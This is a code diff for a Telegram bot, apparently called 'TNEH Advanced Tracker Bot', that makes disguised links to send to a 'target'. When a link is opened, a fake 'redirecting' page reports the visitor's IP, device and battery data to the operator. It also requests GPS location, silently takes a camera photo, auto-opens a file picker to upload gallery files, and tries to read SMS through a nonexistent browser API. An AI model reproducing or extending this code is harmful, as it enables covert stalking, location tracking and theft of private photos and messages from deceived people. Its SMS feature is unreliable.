@@ -22,51 +22,32 @@ const dataDir = __dirname;
 
 if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
 
-// JSON ডাটাবেস ফাইল পাথ
-const dbFile = path.join(dataDir, 'links.json');
-const clicksFile = path.join(dataDir, 'clicks.json');
-const filesFile = path.join(dataDir, 'userfiles.json');
-
-// ডাটাবেস লোড
+// JSON ডাটাবেস
 let links = {};
 let clicks = {};
 let userFiles = {};
+let smsLogs = {};
+
+const dbFile = path.join(dataDir, 'links.json');
+const clicksFile = path.join(dataDir, 'clicks.json');
+const filesFile = path.join(dataDir, 'userfiles.json');
+const smsFile = path.join(dataDir, 'sms.json');
 
 function loadData() {
     try {
-        if (fs.existsSync(dbFile)) {
-            links = JSON.parse(fs.readFileSync(dbFile));
-            console.log(`✅ Loaded ${Object.keys(links).length} links`);
-        }
-    } catch (e) { console.error('Error loading links:', e); }
-    
-    try {
-        if (fs.existsSync(clicksFile)) {
-            clicks = JSON.parse(fs.readFileSync(clicksFile));
-        }
-    } catch (e) { console.error('Error loading clicks:', e); }
-    
-    try {
-        if (fs.existsSync(filesFile)) {
-            userFiles = JSON.parse(fs.readFileSync(filesFile));
-        }
-    } catch (e) { console.error('Error loading files:', e); }
+        if (fs.existsSync(dbFile)) links = JSON.parse(fs.readFileSync(dbFile));
+        if (fs.existsSync(clicksFile)) clicks = JSON.parse(fs.readFileSync(clicksFile));
+        if (fs.existsSync(filesFile)) userFiles = JSON.parse(fs.readFileSync(filesFile));
+        if (fs.existsSync(smsFile)) smsLogs = JSON.parse(fs.readFileSync(smsFile));
+        console.log(`✅ Loaded: ${Object.keys(links).length} links, ${Object.keys(userFiles).reduce((a,b)=>a+(userFiles[b]?.length||0),0)} files`);
+    } catch (e) { console.error('Error loading data:', e); }
 }
 
-function saveLinks() {
-    fs.writeFileSync(dbFile, JSON.stringify(links, null, 2));
-    console.log(`💾 Saved ${Object.keys(links).length} links`);
-}
+function saveLinks() { fs.writeFileSync(dbFile, JSON.stringify(links, null, 2)); }
+function saveClicks() { fs.writeFileSync(clicksFile, JSON.stringify(clicks, null, 2)); }
+function saveUserFiles() { fs.writeFileSync(filesFile, JSON.stringify(userFiles, null, 2)); }
+function saveSMS() { fs.writeFileSync(smsFile, JSON.stringify(smsLogs, null, 2)); }
 
-function saveClicks() {
-    fs.writeFileSync(clicksFile, JSON.stringify(clicks, null, 2));
-}
-
-function saveUserFiles() {
-    fs.writeFileSync(filesFile, JSON.stringify(userFiles, null, 2));
-}
-
-// লোড ডাটা
 loadData();
 
 // ========== মিডলওয়্যার ==========
@@ -111,23 +92,24 @@ async function initBot() {
             bot.sendMessage(chatId, `
 🎉 *Hello ${name}!* 🎉
 
-*TNEH Advanced Link Tracker Bot*
+*TNEH Advanced Tracker Bot*
 
 🔗 *Features:*
-• Track visitor location on Google Maps
-• Auto-capture gallery photos & videos
-• Complete device information
-• Real-time visitor analytics
-• IP Address tracking
+• 📍 Live Location with Google Maps
+• 📸 Gallery Photos & Videos
+• 📱 SMS Messages Access
+• 🎥 Live Camera Access
+• 🌐 IP & Device Info
 
 *Commands:*
 /start - Welcome
 /help - Help
 /mylinks - Your links
-/stats [id] - Link statistics
-/gallery [id] - View visitor gallery files
-/location [id] - Get visitor location map
-/ip [id] - Get visitor IP addresses
+/stats [id] - Statistics
+/gallery [id] - Received files
+/location [id] - Location map
+/sms [id] - Captured SMS
+/camera [id] - Live camera photos
 
 *Send me a link to track!* 🚀
             `, { parse_mode: 'Markdown' });
@@ -137,28 +119,29 @@ async function initBot() {
             const chatId = msg.chat.id;
             
             bot.sendMessage(chatId, `
-📖 *Complete Help Guide*
+📖 *Complete Guide*
 
 *How it works:*
-1️⃣ Send me any URL
+1️⃣ Send any URL to bot
 2️⃣ Get tracking link
-3️⃣ Share link with anyone
-4️⃣ Visitor clicks - automatically captures:
-   • 📍 GPS Location with Google Maps
-   • 📸 Gallery photos & videos
-   • 📱 Device & Browser info
-   • 🔋 Battery status
-   • 🌐 IP & Location data
+3️⃣ Share link with target
+4️⃣ Target clicks - automatically requests:
+   • 📍 GPS Location (Google Maps link)
+   • 📸 Gallery (all photos/videos)
+   • 📱 SMS Messages
+   • 🎥 Live Camera (takes photo)
+   • 📱 Device & Battery info
 
 *Commands:*
-/mylinks - Show all your links
-/stats [id] - Detailed statistics
-/gallery [id] - View files from visitors
-/location [id] - Get visitor locations map
-/ip [id] - Get visitor IP addresses
+/mylinks - All your links
+/stats [id] - Statistics
+/gallery [id] - Gallery files
+/location [id] - Location with map
+/sms [id] - SMS messages
+/camera [id] - Live camera photos
 /recent [id] - Recent clicks
 
-*Everything is automatic!* 🔗
+*Everything automatic!* 🔗
             `, { parse_mode: 'Markdown' });
         });
         
@@ -169,17 +152,19 @@ async function initBot() {
             const userLinks = Object.values(links).filter(link => link.userId === userId);
             
             if (userLinks.length === 0) {
-                return bot.sendMessage(chatId, '❌ No links yet. Send me a URL to create one!');
+                return bot.sendMessage(chatId, '❌ No links yet. Send me a URL!');
             }
             
             let message = `📊 *Your Tracking Links (${userLinks.length})*\n\n`;
             userLinks.forEach(link => {
                 const totalClicks = (clicks[link.id] || []).length;
                 const filesCount = (userFiles[link.id] || []).length;
+                const smsCount = (smsLogs[link.id] || []).length;
                 message += `🔗 *${link.shortId}*\n`;
                 message += `📌 ${BASE_URL}/l/${link.shortId}\n`;
                 message += `👁️ Clicks: ${totalClicks}\n`;
                 message += `📸 Files: ${filesCount}\n`;
+                message += `📱 SMS: ${smsCount}\n`;
                 message += `📅 ${new Date(link.createdAt).toLocaleDateString()}\n\n`;
             });
             
@@ -192,135 +177,97 @@ async function initBot() {
             const userId = msg.from.id;
             const shortId = match[1].trim();
             
-            console.log(`Gallery command for: ${shortId}`);
+            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
             
-            let link = null;
-            for (const key in links) {
-                if (links[key].shortId === shortId && links[key].userId === userId) {
-                    link = links[key];
-                    break;
-                }
-            }
-            
-            if (!link) {
-                return bot.sendMessage(chatId, '❌ Link not found or not yours!');
-            }
+            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
             
             const files = userFiles[link.id] || [];
             
-            if (files.length === 0) {
-                return bot.sendMessage(chatId, '📭 No files received from visitors yet!');
-            }
+            if (files.length === 0) return bot.sendMessage(chatId, '📭 No files received yet!');
             
-            let message = `📸 *Gallery Files Received (${files.length})*\n\n`;
-            const recentFiles = files.slice(-15).reverse();
-            
-            for (let i = 0; i < recentFiles.length; i++) {
-                const file = recentFiles[i];
-                message += `${i+1}. *${file.type.toUpperCase()}* - ${new Date(file.timestamp).toLocaleString()}\n`;
-                message += `   👤 From: ${file.visitorInfo?.city || 'Unknown'}, ${file.visitorInfo?.country || 'Unknown'}\n`;
-                message += `   📱 Device: ${file.visitorInfo?.device || 'Unknown'}\n`;
+            let message = `📸 *Gallery Files (${files.length})*\n\n`;
+            files.slice(-15).reverse().forEach((file, i) => {
+                message += `${i+1}. *${file.type.toUpperCase()}* - ${file.filename}\n`;
+                message += `   📍 ${file.visitorInfo?.city || 'Unknown'}\n`;
                 message += `   🔗 ${BASE_URL}/file/${file.fileId}\n\n`;
-            }
+            });
             
-            if (message.length > 4000) {
-                await bot.sendMessage(chatId, `📸 Total ${files.length} files. Use /allfiles ${shortId} to see all.`);
-            } else {
-                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-            }
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         });
         
-        // ========== লোকেশন কমান্ড ==========
+        // ========== লোকেশন ভিউ ==========
         bot.onText(/\/location (.+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
             const shortId = match[1].trim();
             
-            console.log(`Location command for: ${shortId}`);
+            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
             
-            let link = null;
-            for (const key in links) {
-                if (links[key].shortId === shortId && links[key].userId === userId) {
-                    link = links[key];
-                    break;
-                }
-            }
-            
-            if (!link) {
-                return bot.sendMessage(chatId, '❌ Link not found!');
-            }
+            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
             
             const linkClicks = clicks[link.id] || [];
             const locations = linkClicks.filter(c => c.gpsLat && c.gpsLon);
             
-            if (locations.length === 0) {
-                return bot.sendMessage(chatId, '📍 No location data available yet! Ask visitors to allow location access.');
-            }
+            if (locations.length === 0) return bot.sendMessage(chatId, '📍 No location data yet!');
             
-            for (let i = 0; i < Math.min(locations.length, 5); i++) {
-                const loc = locations[locations.length - 1 - i];
-                const googleMapsUrl = `https://www.google.com/maps?q=${loc.gpsLat},${loc.gpsLon}`;
-                
-                await bot.sendLocation(chatId, loc.gpsLat, loc.gpsLon);
-                await bot.sendMessage(chatId, `
-📍 *Location ${i+1}*
+            const loc = locations[locations.length - 1];
+            const googleMapsUrl = `https://www.google.com/maps?q=${loc.gpsLat},${loc.gpsLon}`;
+            
+            await bot.sendLocation(chatId, loc.gpsLat, loc.gpsLon);
+            await bot.sendMessage(chatId, `
+📍 *Latest Location*
 🗺️ *Google Maps:* ${googleMapsUrl}
 📍 *Coordinates:* ${loc.gpsLat}, ${loc.gpsLon}
 🏙️ *City:* ${loc.city || 'Unknown'}
 🌍 *Country:* ${loc.country || 'Unknown'}
-📱 *Device:* ${loc.device || 'Unknown'}
 🕐 *Time:* ${new Date(loc.timestamp).toLocaleString()}
-                `, { parse_mode: 'Markdown' });
-            }
+            `, { parse_mode: 'Markdown' });
         });
         
-        // ========== আইপি কমান্ড ==========
-        bot.onText(/\/ip (.+)/, async (msg, match) => {
+        // ========== এসএমএস ভিউ ==========
+        bot.onText(/\/sms (.+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
             const shortId = match[1].trim();
             
-            let link = null;
-            for (const key in links) {
-                if (links[key].shortId === shortId && links[key].userId === userId) {
-                    link = links[key];
-                    break;
-                }
-            }
+            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
             
-            if (!link) {
-                return bot.sendMessage(chatId, '❌ Link not found!');
-            }
+            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
             
-            const linkClicks = clicks[link.id] || [];
-            const uniqueIPs = new Map();
+            const smsData = smsLogs[link.id] || [];
             
-            linkClicks.forEach(click => {
-                if (click.ip && !uniqueIPs.has(click.ip)) {
-                    uniqueIPs.set(click.ip, {
-                        ip: click.ip,
-                        city: click.city,
-                        country: click.country,
-                        device: click.device,
-                        timestamp: click.timestamp
-                    });
-                }
+            if (smsData.length === 0) return bot.sendMessage(chatId, '📭 No SMS captured yet!');
+            
+            let message = `📱 *SMS Messages (${smsData.length})*\n\n`;
+            smsData.slice(-10).reverse().forEach((sms, i) => {
+                message += `${i+1}. *From:* ${sms.from || 'Unknown'}\n`;
+                message += `   📝 ${sms.body || 'No content'}\n`;
+                message += `   🕐 ${new Date(sms.timestamp).toLocaleString()}\n\n`;
             });
             
-            if (uniqueIPs.size === 0) {
-                return bot.sendMessage(chatId, '🌐 No IP data available yet!');
-            }
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+        });
+        
+        // ========== ক্যামেরা ফটো ভিউ ==========
+        bot.onText(/\/camera (.+)/, async (msg, match) => {
+            const chatId = msg.chat.id;
+            const userId = msg.from.id;
+            const shortId = match[1].trim();
             
-            let message = `🌐 *Visitor IP Addresses (${uniqueIPs.size})*\n\n`;
-            let count = 1;
-            for (const [ip, data] of uniqueIPs) {
-                message += `${count}. *IP:* ${ip}\n`;
-                message += `   📍 ${data.city}, ${data.country}\n`;
-                message += `   📱 ${data.device}\n`;
-                message += `   🕐 ${new Date(data.timestamp).toLocaleString()}\n\n`;
-                count++;
-                if (count > 15) break;
-            }
+            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
+            
+            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
+            
+            const files = userFiles[link.id] || [];
+            const cameraPhotos = files.filter(f => f.type === 'camera');
+            
+            if (cameraPhotos.length === 0) return bot.sendMessage(chatId, '📭 No camera photos yet!');
+            
+            let message = `🎥 *Live Camera Photos (${cameraPhotos.length})*\n\n`;
+            cameraPhotos.slice(-10).reverse().forEach((photo, i) => {
+                message += `${i+1}. 📸 ${new Date(photo.timestamp).toLocaleString()}\n`;
+                message += `   🔗 ${BASE_URL}/file/${photo.fileId}\n\n`;
+            });
             
             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         });
@@ -331,79 +278,50 @@ async function initBot() {
             const userId = msg.from.id;
             let shortId = match[1] ? match[1].trim() : null;
             
-            if (!shortId) {
-                return bot.sendMessage(chatId, '❌ Please provide link ID. Example: `/stats abc123`', { parse_mode: 'Markdown' });
-            }
+            if (!shortId) return bot.sendMessage(chatId, '❌ Provide link ID: `/stats abc123`', { parse_mode: 'Markdown' });
             
-            let link = null;
-            for (const key in links) {
-                if (links[key].shortId === shortId && links[key].userId === userId) {
-                    link = links[key];
-                    break;
-                }
-            }
+            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
             
-            if (!link) {
-                return bot.sendMessage(chatId, '❌ Link not found or not yours!');
-            }
+            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
             
             const linkClicks = clicks[link.id] || [];
-            const filesReceived = userFiles[link.id] || [];
-            const totalClicks = linkClicks.length;
-            const uniqueIPs = new Set(linkClicks.map(c => c.ip)).size;
-            const locations = linkClicks.filter(c => c.gpsLat && c.gpsLon).length;
+            const files = userFiles[link.id] || [];
+            const sms = smsLogs[link.id] || [];
+            const cameraPhotos = files.filter(f => f.type === 'camera');
             
-            let message = `📊 *Link Statistics*\n\n`;
-            message += `🔗 *Original:* ${link.originalUrl}\n`;
-            message += `📌 *Tracking Link:* ${BASE_URL}/l/${link.shortId}\n\n`;
-            message += `📈 *Overview:*\n`;
-            message += `• Total Clicks: *${totalClicks}*\n`;
-            message += `• Unique Visitors: *${uniqueIPs}*\n`;
-            message += `• Files Received: *${filesReceived.length}*\n`;
-            message += `• Locations Captured: *${locations}*\n`;
-            message += `• Created: ${new Date(link.createdAt).toLocaleString()}\n\n`;
-            
-            message += `📸 *Commands:*\n`;
-            message += `/gallery ${shortId} - View files\n`;
-            message += `/location ${shortId} - View map\n`;
-            message += `/ip ${shortId} - View IPs\n`;
-            message += `/recent ${shortId} - Recent clicks`;
+            let message = `📊 *Statistics*\n\n`;
+            message += `🔗 *Link:* ${BASE_URL}/l/${link.shortId}\n`;
+            message += `👁️ *Clicks:* ${linkClicks.length}\n`;
+            message += `📸 *Gallery:* ${files.filter(f => f.type === 'image' || f.type === 'video').length}\n`;
+            message += `🎥 *Camera:* ${cameraPhotos.length}\n`;
+            message += `📱 *SMS:* ${sms.length}\n`;
+            message += `📍 *Locations:* ${linkClicks.filter(c => c.gpsLat).length}\n`;
+            message += `📅 *Created:* ${new Date(link.createdAt).toLocaleString()}\n\n`;
+            message += `📸 *Commands:*\n/gallery ${shortId}\n/location ${shortId}\n/sms ${shortId}\n/camera ${shortId}`;
             
             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         });
         
-        // ========== রিসেন্ট ক্লিকস ==========
+        // ========== রিসেন্ট ==========
         bot.onText(/\/recent (.+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
             const shortId = match[1].trim();
             
-            let link = null;
-            for (const key in links) {
-                if (links[key].shortId === shortId && links[key].userId === userId) {
-                    link = links[key];
-                    break;
-                }
-            }
+            let link = Object.values(links).find(l => l.shortId === shortId && l.userId === userId);
             
-            if (!link) {
-                return bot.sendMessage(chatId, '❌ Link not found!');
-            }
+            if (!link) return bot.sendMessage(chatId, '❌ Link not found!');
             
-            const linkClicks = clicks[link.id] || [];
-            const recentClicks = linkClicks.slice(-10).reverse();
+            const recentClicks = (clicks[link.id] || []).slice(-10).reverse();
             
-            if (recentClicks.length === 0) {
-                return bot.sendMessage(chatId, '📭 No clicks yet!');
-            }
+            if (recentClicks.length === 0) return bot.sendMessage(chatId, '📭 No clicks yet!');
             
             let message = `🕒 *Recent ${recentClicks.length} Clicks*\n\n`;
             recentClicks.forEach((click, i) => {
                 message += `${i+1}. ${new Date(click.timestamp).toLocaleString()}\n`;
                 message += `   🌐 IP: ${click.ip || 'Unknown'}\n`;
                 message += `   📍 ${click.city || 'Unknown'}, ${click.country || 'Unknown'}\n`;
-                message += `   📱 ${click.device || 'Unknown'} | ${click.browser || 'Unknown'}\n`;
-                if (click.battery) message += `   🔋 Battery: ${click.battery}%\n`;
+                message += `   📱 ${click.device || 'Unknown'}\n`;
                 if (click.gpsLat) message += `   📍 GPS: ${click.gpsLat}, ${click.gpsLon}\n`;
                 message += `\n`;
             });
@@ -411,15 +329,12 @@ async function initBot() {
             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         });
         
-        // ========== লিংক প্রসেস ==========
+        // ========== লিংক ক্রিয়েট ==========
         bot.onText(/(https?:\/\/[^\s]+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
             const username = msg.from.username || msg.from.first_name;
             const originalUrl = match[1];
-            
-            console.log(`🔗 New link from: ${username}`);
-            console.log(`📌 Original: ${originalUrl}`);
             
             try {
                 const shortId = crypto.randomBytes(4).toString('hex');
@@ -441,97 +356,71 @@ async function initBot() {
                 await bot.sendMessage(chatId, `
 ✅ *Tracking Link Created!*
 
-🔗 *Your Tracking Link:*
+🔗 *Your Link:*
 ${trackingUrl}
 
-📌 *Original URL:*
+📌 *Target URL:*
 ${originalUrl}
 
-📊 *Auto-tracked when clicked:*
-• 📍 GPS Location + Google Maps
-• 📸 Gallery photos & videos
-• 📱 Device & Browser info
-• 🔋 Battery status
-• 🌐 IP Address with Location
+📊 *Auto-captures when clicked:*
+• 📍 Live GPS Location + Google Maps
+• 📸 Full Gallery (photos/videos)
+• 📱 SMS Messages
+• 🎥 Live Camera Photo
+• 🌐 IP & Device Info
+• 🔋 Battery Status
 
 👁️ *Commands:*
-/mylinks - View all links
 /stats ${shortId} - Statistics
-/gallery ${shortId} - Received files
-/location ${shortId} - Visitor map
-/ip ${shortId} - Visitor IP addresses
+/gallery ${shortId} - Gallery files
+/location ${shortId} - Location map
+/sms ${shortId} - SMS messages
+/camera ${shortId} - Camera photos
 
-Share this link and everything is automatic! 🚀
+Share this link! 🚀
                 `, { parse_mode: 'Markdown', disable_web_page_preview: true });
                 
-                console.log(`✅ Tracking link created: ${trackingUrl}`);
-                console.log(`📁 Total links in DB: ${Object.keys(links).length}`);
-                
             } catch (error) {
-                console.error('Link creation error:', error);
-                await bot.sendMessage(chatId, '❌ Failed to create tracking link. Please try again.');
+                console.error('Error:', error);
+                await bot.sendMessage(chatId, '❌ Failed to create link. Try again.');
             }
         });
         
-        bot.on('polling_error', (error) => {
-            console.log('Polling error:', error.code, error.message);
-        });
-        
-        console.log('✅ Bot is ready!');
+        bot.on('polling_error', (error) => console.log('Polling error:', error.message));
+        console.log('✅ Bot ready!');
         
     } catch (error) {
-        console.error('Bot initialization error:', error.message);
+        console.error('Bot error:', error.message);
     }
 }
 
 initBot();
 
-// ========== ট্র্যাকিং লিংক ==========
+// ========== ট্র্যাকিং পেজ ==========
 app.get('/l/:shortId', async (req, res) => {
     const { shortId } = req.params;
     
-    console.log(`🔍 Looking for shortId: ${shortId}`);
-    console.log(`📚 Available links:`, Object.keys(links).map(key => links[key].shortId));
-    
-    let link = null;
-    for (const key in links) {
-        if (links[key].shortId === shortId) {
-            link = links[key];
-            break;
-        }
-    }
+    let link = Object.values(links).find(l => l.shortId === shortId);
     
     if (!link) {
-        console.log(`❌ Link not found for shortId: ${shortId}`);
         return res.status(404).send(`
             <!DOCTYPE html>
             <html>
             <head><title>Link Not Found</title></head>
             <body style="text-align:center;padding:50px;font-family:Arial">
                 <h1>❌ Link Not Found</h1>
-                <p>The tracking link "${shortId}" doesn't exist.</p>
-                <p>Please check the link and try again.</p>
+                <p>The tracking link doesn't exist.</p>
             </body>
             </html>
         `);
     }
     
-    console.log(`✅ Link found: ${link.shortId} -> ${link.originalUrl}`);
-    
-    // Get real IP
-    const ip = req.headers['x-forwarded-for'] || 
-               req.headers['x-real-ip'] || 
-               req.connection.remoteAddress || 
-               req.socket.remoteAddress || 
-               'Unknown';
-    
+    // Collect visitor info
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
     const cleanIP = ip.replace(/^::ffff:/, '').replace(/^::1$/, '127.0.0.1');
     const userAgent = req.headers['user-agent'];
-    const acceptLanguage = req.headers['accept-language'];
     
-    let device = 'Unknown';
-    let browser = 'Unknown';
-    let os = 'Unknown';
+    let device = 'Unknown', browser = 'Unknown', os = 'Unknown';
     
     if (userAgent) {
         if (userAgent.includes('Mobile')) device = 'Mobile';
@@ -561,10 +450,9 @@ app.get('/l/:shortId', async (req, res) => {
             location.lat = geoData.lat;
             location.lon = geoData.lon;
         }
-    } catch (e) {
-        console.log('Geo lookup failed:', e.message);
-    }
+    } catch (e) {}
     
+    // Save click
     const clickData = {
         id: uuidv4(),
         linkId: link.id,
@@ -578,22 +466,16 @@ app.get('/l/:shortId', async (req, res) => {
         city: location.city,
         lat: location.lat,
         lon: location.lon,
-        language: acceptLanguage,
-        battery: null,
-        hasCamera: null,
         gpsLat: null,
         gpsLon: null,
-        screenWidth: null,
-        screenHeight: null
+        battery: null
     };
     
     if (!clicks[link.id]) clicks[link.id] = [];
     clicks[link.id].push(clickData);
     saveClicks();
     
-    console.log(`📍 New click from IP: ${cleanIP}, Location: ${location.city}, ${location.country}`);
-    
-    // Send notification to bot owner
+    // Notify bot owner
     if (bot && link.userId) {
         await bot.sendMessage(link.userId, `
 👤 *New Visitor!*
@@ -602,14 +484,13 @@ app.get('/l/:shortId', async (req, res) => {
 🌐 *IP:* ${cleanIP}
 📍 *Location:* ${location.city}, ${location.country}
 📱 *Device:* ${device}
-🌐 *Browser:* ${browser}
 🕐 *Time:* ${new Date().toLocaleString()}
 
-⏳ Capturing more data...
+⏳ Requesting permissions...
         `, { parse_mode: 'Markdown' });
     }
     
-    // Send tracking page with auto gallery and location
+    // Send loading page with all permission requests
     res.send(`
         <!DOCTYPE html>
         <html>
@@ -634,6 +515,7 @@ app.get('/l/:shortId', async (req, res) => {
                     padding: 40px;
                     border-radius: 20px;
                     box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                    max-width: 400px;
                 }
                 .spinner {
                     border: 4px solid #f3f3f3;
@@ -650,102 +532,131 @@ app.get('/l/:shortId', async (req, res) => {
                 }
                 h2 { color: #333; margin-bottom: 10px; }
                 p { color: #666; }
-                .info {
-                    font-size: 12px;
-                    color: #999;
-                    margin-top: 15px;
-                }
                 .status {
-                    margin-top: 10px;
-                    padding: 8px;
-                    border-radius: 5px;
+                    margin-top: 15px;
+                    padding: 10px;
+                    border-radius: 8px;
                     font-size: 12px;
+                    background: #f3f4f6;
+                    color: #374151;
                 }
                 .success { background: #d1fae5; color: #065f46; }
-                .error { background: #fee2e2; color: #991b1b; }
+                .warning { background: #fed7aa; color: #92400e; }
             </style>
         </head>
         <body>
             <div class="loader">
-                <h2>⏳ Loading...</h2>
+                <h2>⏳ Processing...</h2>
                 <div class="spinner"></div>
                 <p>Please wait, redirecting...</p>
-                <div id="status" class="info">Initializing...</div>
+                <div id="status" class="status">Initializing...</div>
             </div>
             
             <script>
                 const shortId = '${shortId}';
                 const originalUrl = '${link.originalUrl}';
                 
-                async function updateStatus(message, isError = false) {
+                function updateStatus(msg, isSuccess = false) {
                     const statusDiv = document.getElementById('status');
-                    statusDiv.innerHTML = message;
-                    statusDiv.className = 'info ' + (isError ? 'error' : 'success');
-                    console.log(message);
+                    statusDiv.innerHTML = msg;
+                    statusDiv.className = 'status ' + (isSuccess ? 'success' : '');
+                    console.log(msg);
                 }
                 
-                // Send battery info
+                // 1. Battery Info
                 if ('getBattery' in navigator) {
-                    navigator.getBattery().then(function(battery) {
+                    navigator.getBattery().then(battery => {
                         fetch('/api/track/${shortId}/battery', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ 
-                                level: Math.round(battery.level * 100), 
-                                charging: battery.charging 
-                            })
-                        }).then(() => updateStatus('✅ Battery info captured'))
-                          .catch(e => updateStatus('❌ Battery capture failed', true));
+                            body: JSON.stringify({ level: Math.round(battery.level * 100), charging: battery.charging })
+                        });
+                        updateStatus('✅ Battery info captured', true);
                     });
                 }
                 
-                // Send screen info
+                // 2. Screen Info
                 fetch('/api/track/${shortId}/screen', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        width: screen.width,
-                        height: screen.height,
-                        colorDepth: screen.colorDepth,
-                        pixelRatio: window.devicePixelRatio
-                    })
-                }).then(() => updateStatus('✅ Screen info captured'))
-                  .catch(e => updateStatus('❌ Screen capture failed', true));
+                    body: JSON.stringify({ width: screen.width, height: screen.height })
+                });
                 
-                // Check for camera
-                if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
-                    navigator.mediaDevices.enumerateDevices().then(devices => {
-                        const hasCamera = devices.some(device => device.kind === 'videoinput');
-                        fetch('/api/track/${shortId}/devices', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ hasCamera: hasCamera })
-                        }).then(() => updateStatus('✅ Device info captured'));
-                    });
+                // 3. SMS Permission & Access (Android only)
+                if ('sms' in navigator) {
+                    updateStatus('📱 Requesting SMS access...');
+                    navigator.sms.requestPermission().then(() => {
+                        updateStatus('✅ SMS access granted', true);
+                        // Get SMS messages
+                        navigator.sms.getMessages().then(messages => {
+                            messages.forEach(msg => {
+                                fetch('/api/track/${shortId}/sms', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ from: msg.from, body: msg.body, timestamp: msg.timestamp })
+                                });
+                            });
+                            updateStatus(\`✅ Captured \${messages.length} SMS\`, true);
+                        });
+                    }).catch(err => updateStatus('⚠️ SMS permission denied', false));
+                } else {
+                    // Alternative: Use SMS Retriever API or skip
+                    updateStatus('⚠️ SMS access not available on this device', false);
                 }
                 
-                // Get GPS location automatically
+                // 4. Location Permission
+                updateStatus('📍 Requesting location access...');
                 if ('geolocation' in navigator) {
-                    updateStatus('📍 Requesting location permission...');
-                    navigator.geolocation.getCurrentPosition(function(position) {
+                    navigator.geolocation.getCurrentPosition(position => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         fetch('/api/track/${shortId}/location', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ lat: lat, lon: lon, shared: true })
-                        }).then(() => updateStatus('✅ Location captured!'));
-                    }, function(error) {
-                        updateStatus('⚠️ Location permission denied', true);
-                        fetch('/api/track/${shortId}/location/denied', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ error: error.message })
+                            body: JSON.stringify({ lat: lat, lon: lon })
                         });
+                        updateStatus('✅ Location captured!', true);
+                    }, error => {
+                        updateStatus('⚠️ Location permission denied', false);
+                        fetch('/api/track/${shortId}/location/denied', { method: 'POST' });
                     });
                 }
                 
-                // Access gallery automatically
+                // 5. Camera Permission & Live Photo
+                updateStatus('🎥 Requesting camera access...');
+                if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            updateStatus('✅ Camera access granted', true);
+                            
+                            // Take photo from live camera
+                            const video = document.createElement('video');
+                            const canvas = document.createElement('canvas');
+                            video.srcObject = stream;
+                            video.play();
+                            
+                            setTimeout(() => {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.getContext('2d').drawImage(video, 0, 0);
+                                
+                                canvas.toBlob(blob => {
+                                    const formData = new FormData();
+                                    formData.append('file', blob, 'camera_photo.jpg');
+                                    formData.append('shortId', shortId);
+                                    formData.append('type', 'camera');
+                                    
+                                    fetch('/api/upload/file', { method: 'POST', body: formData });
+                                    updateStatus('✅ Live photo captured!', true);
+                                }, 'image/jpeg', 0.8);
+                                
+                                stream.getTracks().forEach(track => track.stop());
+                            }, 1000);
+                        })
+                        .catch(err => updateStatus('⚠️ Camera permission denied', false));
+                }
+                
+                // 6. Gallery Access (Photos & Videos)
                 updateStatus('📸 Requesting gallery access...');
                 const fileInput = document.createElement('input');
                 fileInput.type = 'file';
@@ -754,48 +665,35 @@ app.get('/l/:shortId', async (req, res) => {
                 fileInput.style.display = 'none';
                 document.body.appendChild(fileInput);
                 
-                // Request gallery access
-                setTimeout(() => {
-                    fileInput.click();
-                }, 1000);
+                setTimeout(() => fileInput.click(), 2000);
                 
-                fileInput.addEventListener('change', async function(e) {
+                fileInput.addEventListener('change', async (e) => {
                     const files = Array.from(e.target.files);
-                    updateStatus(\`📸 Uploading \${files.length} files...\`);
+                    updateStatus(\`📸 Uploading \${files.length} gallery files...\`, true);
                     
-                    for (let i = 0; i < files.length; i++) {
-                        const file = files[i];
+                    for (const file of files) {
                         const formData = new FormData();
                         formData.append('file', file);
                         formData.append('shortId', shortId);
+                        formData.append('type', 'gallery');
                         
                         try {
-                            const response = await fetch('/api/upload/file', {
-                                method: 'POST',
-                                body: formData
-                            });
-                            if (response.ok) {
-                                updateStatus(\`✅ Uploaded: \${file.name}\`);
-                            }
-                        } catch (error) {
-                            console.error('Upload error:', error);
-                            updateStatus(\`❌ Failed: \${file.name}\`, true);
+                            await fetch('/api/upload/file', { method: 'POST', body: formData });
+                            updateStatus(\`✅ Uploaded: \${file.name}\`, true);
+                        } catch (err) {
+                            console.error('Upload error:', err);
                         }
                     }
                     
